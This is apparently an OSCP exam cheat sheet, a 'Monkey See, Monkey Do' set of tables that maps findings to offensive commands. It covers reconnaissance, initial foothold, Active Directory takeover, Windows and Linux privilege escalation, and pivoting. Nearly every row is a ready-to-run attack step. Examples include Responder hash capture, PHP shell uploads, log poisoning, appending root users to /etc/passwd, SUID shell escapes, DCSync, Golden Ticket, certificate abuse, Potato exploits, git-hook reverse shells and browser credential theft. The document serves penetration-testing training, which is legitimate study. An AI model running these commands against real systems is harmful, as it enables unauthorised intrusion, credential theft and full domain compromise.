# OSCP Tactical Decision Matrix (Monkey See, Monkey Do)

This matrix is designed for rapid triage. When you see a specific "indicator" or "finding," perform the corresponding "action."

---

## 1. Reconnaissance & Initial Foothold

| If You See (Indicator) | Do This (Immediate Action) | Goal |
| :--- | :--- | :--- |
| **Port 445 (SMB) Open** | `netexec smb 10.10.10.10 -u '' -p '' --shares` | Check for null sessions / sensitive files |
| **Port 389 (LDAP) Open** | `ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local"` | Check for Anonymous Bind / User Descriptions |
| **Port 88 (Kerberos) Open** | `kerbrute userenum -d domain.local users.txt` | Enumerate valid users for Roasting |
| **Port 1433 (MSSQL) Open** | `impacket-mssqlclient 'DOMAIN/user':'pass'@10.10.10.10 -windows-auth` | Check for DB access / xp_cmdshell |
| **Port 5985 (WinRM) Open** | `evil-winrm -i 10.10.10.10 -u user -p pass` | Get an initial shell |
| **Werkzeug/Flask Help** | `curl http://[IP]:[PORT]/help` | Discover API endpoints / file upload |
| **Web Search/URL Input** | Trigger `http://172.10.10.10` with `responder` running | Capture NTLM hashes (SSRF) |
| **LFI Vulnerability** | Try `//172.10.10.10/share` with `responder` running | Capture NTLM hashes (LFI-to-SMB) |
| **FileUpload (Blocked .php)** | Upload `.htaccess` with `AddType` directive | Bypass extension filters |
| **Writable SMB Share** | Upload `.lnk` file via `ntlm_theft.py` | Force NTLM authentication (Responder) |
| **Port 8443 (HTTPS) Open** | ManageEngine Applications Manager | Try `admin:admin` -> Admin -> Actions -> Execute Program RCE |
| **BloodHound (WriteOwner GPO)** | User can modify a GPO | Use `bloodyAD` to set `genericAll`, then edit `GptTmpl.inf` in SYSVOL |
| **MariaDB (XAMPP) Found** | Port 3306 on Windows | Check `C:\xampp\passwords.txt` for default `root` creds |
| **Web Service (Anonymous)** | `cadaver http://10.10.10.10` | Check for WebDAV PUT/MOVE permissions |
| **CMS Admin Access** | Upload PHP shell via Plugin/Extension/Theme | RCE on web server |
| **Nagios XI (Title/Favicon)**| Try `nagiosadmin:admin` or `nagiosadmin:nagios` | Admin access for RCE |
| **BUILTIN\Backup Operators** | User has backup/restore rights | Use `reg save` to dump SAM/SYSTEM and crack hashes |
| **Onboarding Document (.docx)** | Found in user home/shares | Scan for plaintext credentials (z.thomas, etc.) |
| **SQL Connection String (.sql)** | Found in web root/shares | Extract DB service account credentials (db_user) |
| **Nagios XI Admin Access** | Upload ELF shell as plugin to `monitoringplugins.php` | RCE as `nagios` or `root` |
| **LFI (No Wrappers)** | Check `/var/log/apache2/access.log` (Poison UA) | LFI-to-RCE via Log Poisoning |
| **Port 1433 Cracked** | `mssqlclient ...` then check `IMPERSONATE` rights | Escalation within SQL to Admin/System |
| **MySQL (root access)** | `SELECT INTO OUTFILE ...` | Write PHP shell for RCE |
| **Windows AutoLogon** | `reg query "HKLM\...\Winlogon" /v DefaultPassword` | Cleartext credentials |
| **.git Directory Found** | `git-dumper [URL] .git` -> `git log` -> `git show` | Credential leak in history |
| **Adminer.php Found** | Try recovered DB credentials | Data dumping (Users/Hashes) [Tre] |
| **SQLi (No Web Output)** | Check secondary systems (Email, Logs, Databases) | Out-of-Band (OOB) SQLi detection [InsanityHosting] |
| **Git: Multiple Branches** | `ls -lna .git/logs/refs/heads \| sort -n -r` | Find branch with most "action" / potential secrets |
| **Screen 4.5.0 Binary**| Run SUID exploit (libhax.so + rootshell) | Root access (Linux) |
| **Encrypted ZIP Found**| `zip2john` -> `john` (Rockyou) | Extract creds from backup files |
| **PuTTY Installed** | Check registry `SimonTatham\PuTTY\Sessions` | Passwords in session parameters |
| **Port 11211 Open** | `memcstat` (try anon/SASL) | Credential/session dumping |
| **Sudo /usr/bin/git** | `sudo git help config` -> `!/bin/sh` | Immediate root shell |
| **User Unzips Git Repo**| Create `.git/hooks/post-commit` revshell | Hijack user execution |
| **Git Creds Fail (SSH)**| Brute force SSH (ncrack/hydra) | Real password may be simpler |
| **C:\windows.old Found** | `download C:\windows.old\Windows\System32\config\SAM` | Offline credential dumping |
| **WPScan: "No plugins"** | Check page source for style/script links in `/plugins/` | Manual discovery of hidden/unreported plugins |
| **Social Warfare v3.5.0** | `?swp_debug=load_options&swp_url=http://[IP]/pay.txt` | Unauthenticated RCE [SoSimple] |
| **AdRotate Plugin found** | Check Manage Media/Banners for Zip Upload | RCE via Zip extraction [Loly] |
| **Joomla CMS Found** | `joomscan --url http://[IP] --enumerate-components` | Find vulnerable extensions / components |
| **Joomla 3.7.x (SQLi)** | Try PoCs (Metasploit/Manual) | **Warning**: High Rabbit Hole potential. If fails, use `cewl` for brute force [GlasgowSmile] |
| **Drupal CMS Found** | `droopescan scan drupal --url http://[IP]` | Find vulnerable themes / modules |
| **Mobile Mouse (Port 9099)**| Test for unauthenticated RCE | Command execution via raw TCP packets [OSCPC] |
| **Webmin (Port 20000)** | Check GnuPG module for command injection| RCE via malicious key names [OSCPC] |
| **Werkzeug/Flask (Port 5000)** | Test payloads like `{{7*7}}` in inputs | Possible SSTI (Jinja2) [Djinn3] |
| **sar2HTML found** | `?plot=;whoami` | sar2HTML 3.2.1 RCE [Sar] |
| **wpDiscuz found (<=7.0.4)**| `python3 wpdiscuz.py -u [URL] -p "/?p=[ID]"` | Unauthenticated RCE via file upload bypass |
| **Binary Execution Panic**| Observe error output for string leaks | Revealed credentials/hashes in memory [OSCPC] |
| **IIS AppCmd.exe Found** | `appcmd.exe list apppool /config` | Credential harvesting from AppPools [OSCPC] |
| **C:\windows.old Dir** | `dir /s C:\windows.old\SAM` | Recover legacy SAM/SYSTEM hashes [OSCPC] |
| **PS History found** | `type [Path]\ConsoleHost_history.txt` | Cleartext passwords/runas commands [OSCPC] |
| **B64 in Web Comment** | `echo [B64] \| base64 -d > secret.png` | Hidden file discovery (Stego) |
| **PNG File Header** | `zbarimg [file]` | Check for QR code content |
| **Audio Spectrogram Morse**| `morse2ascii [file.wav]` | Extract hidden Morse credentials |
| **ROT / B64 Chain** | Check standard B64 decode for ROT1/ROT13 results | Multi-layered credential hiding [GlasgowSmile] |
| **Writable /etc/passwd** | `echo 'root2:[HASH]:0:0:root:/root:/bin/bash' >> /etc/passwd` | Immediate root privilege escalation |
| **Fuzzing: Missed Dirs**| Try lowercase wordlist: `directory-list-lowercase-2.3-medium.txt` | Bypass case-sensitive filtering / unique naming |
| **Shell Restricted (rbash)**| `ssh [user]@[IP] -t "bash --noprofile"` or use `vi` | Escape restricted shell environment |
| **Local Mail (mbox)** | `cat /var/mail/[USER]` or `cat ~/mbox` | Check for internal hints/passwords in emails |
| **World-Writable Script**| Inject SUID bash/revshell into script | Hijack automated tasks (Crons) |
| **Tar Wildcard in Cron** | `touch ./--checkpoint=1` then run `exec=sh payload.sh` | Hijack root cronjob execution |
| **Restricted API Upload** | Inject SSH key to `~/.ssh/authorized_keys` | Pivot from file write to SSH shell |
| **Sudo with Traversal** | `sudo /../../../../[BIN] /tmp/any` | Cooperative Tactic: Use User B to prep binary for User A's Sudo |
| **Cooperative Pivot** | Prep payload as User B -> Trigger as User A | Multi-step PrivEsc when permissions are split |
| **SeImpersonate Found** | `.\GodPotato-NET4.exe -cmd "[CMD]"` or PrintSpoofer | Immediate System privilege escalation (Service Accounts) |
| **Isolated Target** | Use MS01 IIS root (`C:\inetpub\wwwroot`) as relay | Internal tool staging when internet is blocked |
| **MSSQL sysadmin** | Enable `xp_cmdshell` then check `SeImpersonate` | Common path from SQL service account to System |
| **Spring search?query=** | SSTI or Apache Commons Text RCE | Check for EL injection or Java RCE payloads |
| **JDWP (Port 8000)** | `-Xdebug address=8000` in `ps aux` | Root RCE via Java Debug Wire Protocol |
| **FreeSWITCH (8021)** | Port 8021 open (mod_event_socket) | Check for default creds `ClueCon` or RCE scripts |
| **SNMP Open (161)** | `snmp-check [IP] -c public` | Enumerate users, processes, and contact info |
| **Relative Path SUID** | `strings [BIN]` -> calls without `/` | PATH hijacking to gain root |
| **PHP: strcmp() Login** | Send `password[]=` as an array | Bypass authentication (Type Juggling) [Potato] |
| **Sudo: Wildcard Path** | `sudo /bin/nice /notes/../bin/bash` | Bypass directory restriction via Traversal [Potato] |
| **.mozilla Dir (Home)** | Exfil `logins.json` and `key4.db` -> Decrypt | Credential harvesting (Browser) [InsanityHosting] |
| **Hidden .passwd file** | `cat /home/[USER]/.passwd` | Check home dirs for hidden credential files |
| **Encrypted SSH Key** | `ssh2john id_rsa > hash` -> `john` | Found `id_rsa` with `Proc-Type: 4,ENCRYPTED` [EvilboxOne] |

### 1.5. Post-Exploitation Tactics

| Indicator | Immediate Actions | Goal |
| :--- | :--- | :--- |
| **WordPress Installed** | `cat /var/www/html/wp-config.php` | Recover DB credentials (`DB_USER`, `DB_PASSWORD`) |
| **MySQL Access** | `SELECT user_login, user_pass FROM wp_users;` | Extract user hashes for cracking/spraying |
| **Root Shell Obtained** | `cat /root/proof.txt` | Capture machine flag |

---

## 2. Active Directory Pivot (BloodHound Logic)

| If BloodHound Shows (Edge) | Do This (Exploit Command) | Goal |
| :--- | :--- | :--- |
| **GenericAll (Computer)** | **RBCD Attack**: `addcomputer` -> `rbcd` -> `getST` | System access on that Computer |
| **GenericAll (GPO)** | `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [ME]` | Become Local Admin via Policy |
| **GenericAll (User)** | `net rpc password "target" "newpass" -U "me%pass"` | Take over the user account |
| **ForceChangePassword** | `net rpc password "target" "newpass" -U "me%pass"` | Immediate account takeover |
| **ReadLAPSPassword** | `netexec smb 10.10.10.10 -u [ME] -p [PASS] --laps` | Get Local Administrator credentials |
| **HasSession (on Target)** | `impacket-secretsdump` or `mimikatz` (if admin) | Extract credentials from LSASS/SAM |
| **Bidirectional Trust** | **Golden Ticket + Extra SIDs**: `kerberos::golden ... /sids:[PARENT]-519` | Escalate to Parent Enterprise Admin |
| **GenericWrite (on User)** | **Shadow Credentials**: `certipy shadow auto` | Impersonate User via Certificate |
| **GenericWrite (on GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
| **BloodHound: ESC1** | `certipy req ... -upn administrator` | Full Domain Admin via Certificate |
| **CA Server (Port 80/443)** | **ESC8**: Relay SMB/RPC to CA Web Enrollment | Computer/User Impersonation |
| **Service Hash Cracked** | **Silver Ticket**: `impacket-ticketer -spn ...` | Access specific service as ANY user |
| **DCSync Rights** | `impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@DC` | Dump ALL Domain Hashes |

---

## 3. Windows Privilege Escalation

| If `whoami /priv` Shows | Do This (Immediate Action) | Result |
| :--- | :--- | :--- |
| **SeImpersonate** | `PrintSpoofer.exe -c "cmd.exe" -i` | SYSTEM Shell |
| **SeImpersonate (MariaDB RCE)** | Upload WebShell -> `PrintSpoofer.exe` | SYSTEM shell from DB service |
| **SeImpersonate (Newer OS)** | `GodPotato.exe -cmd "rev_shell_cmd"` | SYSTEM Shell |
| **Win 10 Build 1809-19043** | **HiveNightmare**: `.\HiveNightmare.exe` | Read SAM/SECURITY as user |
| **SeBackup** | `reg save hklm\sam SAM` then `secretsdump` local | Local Admin Hashes |
| **SeRestore** | `ren Utilman.exe ...` -> Replace with `cmd.exe` | SYSTEM Shell at Login Screen |
| **SeManageVolume** | `SeManageVolumeExploit.exe` -> `tzres.dll` Hijack | SYSTEM Shell via `systeminfo` |
| **SeTakeOwnership** | Take ownership of `C:\Windows\System32\sethc.exe` | Persistence / Hijack (Sticky Keys) |
| **Unquoted Service Path** | `wmic service get pathname` (Look for spaces and no quotes) | Hijack binary path for SYSTEM shell |
| **Modifiable Reg Key** | `Set-ItemProperty -Path HKLM:\...\Services\X -Name ImagePath ...` | Service Hijack (SYSTEM shell) |
| **Local Port 8080/8443** | `netstat -ano \| findstr LISTENING` | Tunnel via Chisel to access internal web apps |

---

## 4. Linux Privilege Escalation

| If `sudo -l` Shows | Do This (Immediate Action) | Result |
| :--- | :--- | :--- |
| **(ALL) NOPASSWD: ALL** | `sudo su -` or `sudo /bin/bash` | Root |
| **NOPASSWD: /usr/bin/find** | `sudo find . -exec /bin/sh \; -quit` | Root Shell |
| **NOPASSWD: /usr/bin/vim** | `sudo vim -c ':!/bin/sh'` | Root Shell |
| **NOPASSWD: /bin/nice** | `sudo /bin/nice /notes/../bin/bash -p` | Bypass wildcard/directory restrictions [Potato] |
| **NOPASSWD: /usr/bin/tee** | `echo "root2::0:0::/root:/bin/bash" \| sudo tee -a /etc/passwd` | Create Root User |
| **NOPASSWD: /usr/sbin/service** | `sudo -u [USER] /usr/sbin/service ../../bin/bash` | Path traversal lateral movement [SoSimple] |
| **Sudo: Missing Script** | Create script in writable path -> `sudo [SCRIPT]` | PrivEsc via file resurrection [SoSimple] |
| **SUID: /usr/bin/python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` | Root Shell (if Cap-enabled) |

---

## 5. Automated SUID Triage

| If SUID Binary Is | Run This (Monkey Do) |
| :--- | :--- |
| **find** | `find . -exec /bin/sh -p \; -quit` |
| **env** | `env /bin/sh -p` |
| **taskset** | `taskset 1 /bin/sh -p` |
| **flock** | `flock -u / /bin/sh -p` |
| **capsh** | `capsh --gid=0 --uid=0 --` |
| **python** | `python -c 'import os; os.setuid(0); os.system("/bin/sh -p")'` |
| **awk** | `awk 'BEGIN {system("/bin/sh -p")}'` | Fast root shell [SUID] |
| **SUID Binary** | Check `gtfobins` | PrivEsc via specific binary |
| **Modifiable Windows Service** | `sc query [name]`, `accesschk.exe` | Binary overwrite / Path hijack [OSCPC] |
| **Tar Wildcard (*) Found**| `ls -la` (check dir permissions) | Cronjob hijacked via Tar arguments [OSCPC] |
| **Writable /etc/passwd** | `ls -la /etc/passwd` | Inject root user (Vegeta1/Evilbox) |
| **Sudo -l (adduser)** | `sudo adduser [USER] [GROUP]` | PrivEsc by adding self to sudo group |
| **NOPASSWD: /usr/sbin/adduser** | `sudo adduser [USER] --gid 0` | Vertical escalation via root group |
| **NOPASSWD: /usr/bin/apt-get** | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash` | GTFOBins Root Shell |
| **SUID: /usr/bin/pkexec** | `gcc poc.c -o poc && ./poc` | PwnKit (CVE-2021-4034) Root [Djinn3] |
| **Old Kernel (<4.13.9)** | `uname -a` -> `searchsploit linux kernel [VER] privilege escalation` | Kernel LPE [Loly] |
| **sed** | `sed -n '1e exec /bin/sh -p' /etc/hosts` |
| **nano/vi** | `:py3 import os; os.setuid(0); os.system("/bin/dash")` |
| **bash** | `bash -p` |
| **git** | `sudo git help config` -> `!/bin/sh` |
| **gdb** | `gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit` |
| **gimp** | `gimp-2.10 -idf --batch-interpreter python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'` |

| **SeImpersonate** | `PrintSpoofer.exe -i -c cmd` or `GodPotato.exe` | SYSTEM Shell |
| **sudo -l (openvpn)** | `sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'` | Root Shell (Linux) |
| **MSSQL (xp_cmdshell Error)** | Check `sp_configure` then try `sqlcmd` data dumping | Bypass error/restriction via xp_cmdshell tricks |
| **404 on Hive Download** | Rename SAM/SYSTEM to `.txt` then download | Evade IIS MIME filtering (Medtech) |
| **Isolated Target (Scan)** | Use PowerShell TCP loop script | Discover internal ports from foothold (Medtech) |
If GTFOBins is missing your binary, build it:
1.  **Entry Point**: The binary name + "Execute" flag (e.g., `gdb -ex`).
2.  **Language**: Import a library for OS interaction (e.g., `python import os`).
3.  **Goal**: Execute `/bin/sh -p` (e.g., `os.execl("/bin/sh", "sh", "-p")`).

---

## 6. Common Blockers & Operational Fixes

| If This Happens (Problem) | Do This (Fix) | Result |
| :--- | :--- | :--- |
| **Clock Skew Error** | `faketime -f -5m netexec ...` or `ntpdate [DC]` | Fixes Kerberos/AD Auth |
| **Need Win Binary on Kali** | `x86_64-w64-mingw32-gcc ...` | Compile .c to .exe locally |
| **Blocked on Internal IP** | `ligolo-ng` (if UDP 11601 works) or `chisel` | Access internal subnets |
| **No "bash -i" possible** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Stable TTY |
| **.bash_history -> /dev/null**| Check `ls -la ~` for other files like `.viminfo` | Anti-forensics detected; look elsewhere |
| **.viminfo Found** | Check `Search String History` for passwords | Credentials often leaked in vim searches |
| **Proxychains fails** | Check `SOCKS5` version in `/etc/proxychains.conf` | Restores pivoting flow |
| **Sudo: /sbin/shutdown** | Modify world-writable startup script -> reboot | Trigger root escalation [Tre] |
| **LAPS Reading Empty** | Ensure you have `GenericRead` or `All` on the target | Get Local Admin Password |

---

### Pro Tip: The Triad of Despair
If you are stuck for more than 30 minutes, always check:
1.  **Internal Ports**: `netstat -ano` (Windows) or `ss -lntp` (Linux). Is there a local-only web app for Chisel?
2.  **User Descriptions**: `ldapsearch` or `net user`. Are there passwords in the notes?
3.  **Config Files**: `grep -ri "pass" /etc" or "findstr /s /i "password" *.xml`.
4.  **Old Backups**: Look for `C:\windows.old`. If found, dump `SAM/SYSTEM` for old local hashes.


**Results over theories. Execute and move.** 🚀

### 11 AD: Inter-Domain Trust & Delegation
| Indicator | Immediate Action | Tactic/Tool |
| :--- | :--- | :--- |
| **AllExtendedRights** on User | Reset password of target user | `bloodyAD set password` |
| **GenericAll** on Computer | Exploit RBCD | `impacket-addcomputer` + `bloodyAD add rbcd` |
| **Inter-Domain krbtgt** Ticket | DCSync parent from child | `Mimikatz` tickets export -> `Impacket-secretsdump -k` |
| **SeImpersonate** Enabled | Potato-style LPE | `GodPotato`, `PrintSpoofer` |
